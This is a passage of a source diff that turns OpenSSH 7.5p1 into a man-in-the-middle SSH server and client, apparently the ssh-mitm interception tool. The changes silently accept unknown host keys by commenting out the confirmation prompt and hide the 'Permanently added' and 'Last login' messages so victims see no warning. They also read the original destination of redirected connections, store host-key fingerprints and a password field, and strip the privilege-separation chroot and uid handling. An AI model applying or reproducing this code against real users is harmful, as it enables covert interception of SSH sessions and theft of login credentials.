 				    user_hostfiles[0]);
-			else
-				logit("Warning: Permanently added the %s host "
+			/* Suppress the warning about adding this host key. */
+			/*else
+			  logit("Warning: Permanently added the %s host "
 				    "key for IP address '%.128s' to the list "
-				    "of known hosts.", type, ip);
+				    "of known hosts.", type, ip);*/
+
 		} else if (options.visual_host_key) {
 			fp = sshkey_fingerprint(host_key,
 			    options.fingerprint_hash, SSH_FP_DEFAULT);
@@ -995,8 +1001,8 @@
 			    msg2);
 			free(ra);
 			free(fp);
-			if (!confirm(msg))
-				goto fail;
+			/*if (!confirm(msg))
+			  goto fail;*/
 			hostkey_trusted = 1; /* user explicitly confirmed */
 		}
 		/*
@@ -1023,13 +1029,17 @@
 			    host_key, options.hash_known_hosts);
 			hostp = host;
 		}
+		/* Suppress compiler warning about hostp being set but not
+		 * used. */
+		if (hostp) {}
 
 		if (!r)
 			logit("Failed to add the host to the list of known "
 			    "hosts (%.500s).", user_hostfiles[0]);
-		else
+		/* Suppress the warning message about adding to known_hosts  */
+		/*else
 			logit("Warning: Permanently added '%.200s' (%s) to the "
-			    "list of known hosts.", hostp, type);
+			"list of known hosts.", hostp, type);*/
 		break;
 	case HOST_REVOKED:
 		error("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
@@ -1243,6 +1253,13 @@
 	char valid[64], *fp = NULL, *cafp = NULL;
 	struct sshkey *plain = NULL;
 
+	/* Add the host key's fingerprints to the array.  Both the old MD5 and new SHA256 fingerprints are stored. */
+	if ((server_hostkey_fps != NULL) && (num_hostkey_fps < MAX_SERVER_HOSTKEY_FPS)) {
+	  server_hostkey_fps[num_hostkey_fps].old = sshkey_fingerprint(host_key, SSH_DIGEST_MD5, SSH_FP_DEFAULT);
+	  server_hostkey_fps[num_hostkey_fps].new = sshkey_fingerprint(host_key, SSH_DIGEST_SHA256, SSH_FP_DEFAULT);
+	  num_hostkey_fps++;
+	}
+
 	if ((fp = sshkey_fingerprint(host_key,
 	    options.fingerprint_hash, SSH_FP_DEFAULT)) == NULL) {
 		error("%s: fingerprint host key: %s", __func__, ssh_err(r));
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshconnect.h openssh-7.5p1-mitm/sshconnect.h
--- openssh-7.5p1/sshconnect.h	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sshconnect.h	2017-07-24 15:25:11.271472637 -0400
@@ -29,6 +29,7 @@
 	Key	**keys;
 	int	nkeys;
 	int	external_keysign;
+	char	*password;
 };
 
 struct addrinfo;
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshd.c openssh-7.5p1-mitm/sshd.c
--- openssh-7.5p1/sshd.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sshd.c	2017-07-24 15:25:11.271472637 -0400
@@ -72,6 +72,8 @@
 #include <string.h>
 #include <unistd.h>
 #include <limits.h>
+#include <arpa/inet.h>
+#include <linux/netfilter_ipv4.h>
 
 #ifdef WITH_OPENSSL
 #include <openssl/dh.h>
@@ -122,6 +124,7 @@
 #include "ssh-sandbox.h"
 #include "version.h"
 #include "ssherr.h"
+#include "lol.h"
 
 /* Re-exec fds */
 #define REEXEC_DEVCRYPTO_RESERVED_FD	(STDERR_FILENO + 1)
@@ -201,6 +204,9 @@
 	int	have_ssh2_key;
 } sensitive_data;
 
+
+Lol *lol = NULL;
+
 /* This is set to true when a signal is received. */
 static volatile sig_atomic_t received_sighup = 0;
 static volatile sig_atomic_t received_sigterm = 0;
@@ -543,10 +549,13 @@
 	/* Demote the child */
 	if (getuid() == 0 || geteuid() == 0) {
 		/* Change our root directory */
+/* chroot() won't work since we are not running as root. */
+/*
 		if (chroot(_PATH_PRIVSEP_CHROOT_DIR) == -1)
 			fatal("chroot(\"%s\"): %s", _PATH_PRIVSEP_CHROOT_DIR,
 			    strerror(errno));
-		if (chdir("/") == -1)
+*/
+		if (chdir("/home/ssh-mitm/") == -1)
 			fatal("chdir(\"/\"): %s", strerror(errno));
 
 		/* Drop our privileges */
@@ -672,6 +681,7 @@
  skip:
 	/* It is safe now to apply the key state */
 	monitor_apply_keystate(pmonitor);
+	monitor_apply_lol(pmonitor, lol);
 
 	/*
 	 * Tell the packet layer that authentication was successful, since
@@ -1372,6 +1382,18 @@
 	int keytype;
 	Authctxt *authctxt;
 	struct connection_info *connection_info = get_connection_info(0, 0);
+#ifndef DEBUG_HOST
+	struct sockaddr_in origaddr;
+	socklen_t origaddr_len = sizeof(origaddr);
+#endif
+
+	lol = (Lol *)calloc(1, sizeof(Lol));
+
+        /* Terminate if sshd_mitm is running in a privileged account. */
+        if ((getuid() < 500) || (getgid() < 500) || (geteuid() < 500) || (getegid() < 500)) {
+            fprintf(stderr, "Error: sshd_mitm must be run under a non-privileged account!  UID and GID must be >= 500.\n");
+            exit(-1);
+        }
 
 	ssh_malloc_init();	/* must be called before any mallocs */
 
@@ -1780,7 +1802,8 @@
 		    (st.st_uid != getuid () ||
 		    (st.st_mode & (S_IWGRP|S_IWOTH)) != 0))
 #else
-		if (st.st_uid != 0 || (st.st_mode & (S_IWGRP|S_IWOTH)) != 0)
+                /* Ownership of the chroot directory no longer relevant. */
+                if (0)
 #endif
 			fatal("%s must be owned by root and not group or "
 			    "world-writable.", _PATH_PRIVSEP_CHROOT_DIR);
@@ -1956,6 +1979,17 @@
 	signal(SIGCHLD, SIG_DFL);
 	signal(SIGINT, SIG_DFL);
 
+#ifndef DEBUG_HOST
+	if (getsockopt(sock_in, SOL_IP, SO_ORIGINAL_DST, (struct sockaddr *)&origaddr, &origaddr_len) != 0)
+	  fatal("%s: getsockopt failed.", __func__);
+
+	lol->original_host = strdup(inet_ntoa(origaddr.sin_addr));
+	lol->original_port = ntohs(origaddr.sin_port);
+#else
+	lol->original_host = strdup(DEBUG_HOST);
+	lol->original_port = DEBUG_PORT;
+#endif
+
 	/*
 	 * Register our connection.  This turns encryption off because we do
 	 * not have a key.
@@ -2040,6 +2074,7 @@
 	 */
 	if (use_privsep) {
 		mm_send_keystate(pmonitor);
+		mm_send_lol(pmonitor, lol);
 		exit(0);
 	}
 
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshd_config openssh-7.5p1-mitm/sshd_config
--- openssh-7.5p1/sshd_config	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sshd_config	2017-07-24 15:25:11.271472637 -0400
@@ -10,22 +10,24 @@
 # possible, but leave them commented.  Uncommented options override the
 # default value.
 
-#Port 22
+Port 2222
 #AddressFamily any
 #ListenAddress 0.0.0.0
 #ListenAddress ::
 
-#HostKey /etc/ssh/ssh_host_rsa_key
+HostKey /home/ssh-mitm/etc/ssh_host_rsa_key
 #HostKey /etc/ssh/ssh_host_dsa_key
 #HostKey /etc/ssh/ssh_host_ecdsa_key
-#HostKey /etc/ssh/ssh_host_ed25519_key
+HostKey /home/ssh-mitm/etc/ssh_host_ed25519_key
+
+PrintMotd no
 
 # Ciphers and keying
 #RekeyLimit default none
 
 # Logging
-#SyslogFacility AUTH
-#LogLevel INFO
+SyslogFacility AUTH
+LogLevel INFO
 
 # Authentication:
 
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshlogin.c openssh-7.5p1-mitm/sshlogin.c
--- openssh-7.5p1/sshlogin.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sshlogin.c	2017-07-24 15:25:11.275472722 -0400
@@ -113,7 +113,8 @@
 		else
 			snprintf(buf, sizeof(buf), "Last login: %s from %s\r\n",
 			    time_string, hostname);
-		buffer_append(&loginmsg, buf, strlen(buf));
+		/* Suppress message about last login. */
+		/*buffer_append(&loginmsg, buf, strlen(buf));*/
 	}
 # endif /* CUSTOM_SYS_AUTH_GET_LASTLOGIN_MSG */
 #endif /* NO_SSH_LASTLOG */
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/uidswap.c openssh-7.5p1-mitm/uidswap.c
--- openssh-7.5p1/uidswap.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/uidswap.c	2017-07-24 15:25:11.275472722 -0400
@@ -59,6 +59,8 @@
 void
 temporarily_use_uid(struct passwd *pw)
 {
+        /* Since we are never running as root, don't ever try to change uid/gid. */
+	return;
 	/* Save the current euid, and egroups. */
 #ifdef SAVED_IDS_WORK_WITH_SETEUID
 	saved_euid = geteuid();
@@ -134,6 +136,8 @@
 void
 permanently_drop_suid(uid_t uid)
 {
+        /* Since we are never running as root, don't ever try to change uid/gid. */
+	return;
 #ifndef NO_UID_RESTORATION_TEST
 	uid_t old_uid = getuid();
 #endif
@@ -168,6 +172,8 @@
 void
 restore_uid(void)
 {
+        /* Since we are never running as root, don't ever try to change uid/gid. */
+	return;
 	/* it's a no-op unless privileged */
 	if (!privileged) {
 		debug("restore_uid: (unprivileged)");
@@ -205,6 +211,8 @@
 void
 permanently_set_uid(struct passwd *pw)
 {
+        /* Since we are never running as root, don't ever try to change uid/gid. */
+	return;
 #ifndef NO_UID_RESTORATION_TEST
 	uid_t old_uid = getuid();
 	gid_t old_gid = getgid();
